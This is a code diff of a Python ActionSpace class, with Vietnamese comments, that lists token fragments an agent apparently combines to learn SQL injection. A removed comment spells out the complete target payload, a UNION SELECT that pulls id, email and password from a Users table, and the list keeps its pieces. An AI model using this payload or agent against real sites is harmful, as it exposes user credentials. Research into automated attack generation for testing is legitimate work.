@@ -1,24 +1,24 @@
 class ActionSpace:
     def __init__(self):
-        # Target: a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
+        # Bộ mảnh ghép (Puzzle Pieces)
         self.actions = [
-            # 1. Mở đầu & Kết thúc
+            # 1. Entry & Exit (Cửa vào và Cửa ra)
             "a'))", 
-            " FROM Users",
             "--",
             
-            # 2. Keywords SQL
+            # 2. SQL Syntax (Khung sườn)
             " UNION",
             " SELECT",
+            " FROM Users", # Mảnh này hơi to, nhưng tạm chấp nhận cho bài toán này
             
-            # 3. Các cột dữ liệu (kèm dấu phẩy hoặc không để nó tự học cách đặt dấu phẩy)
+            # 3. Values & Separators (Gạch vữa để xây)
+            " NULL",
+            ",",
+            
+            # 4. Payload Data (Nội thất bên trong)
             " id", 
             " email", 
-            " password",
-            
-            # 4. NULL và Dấu câu
-            " NULL",
-            "," 
+            " password"
         ]
         self.num_actions = len(self.actions)
 
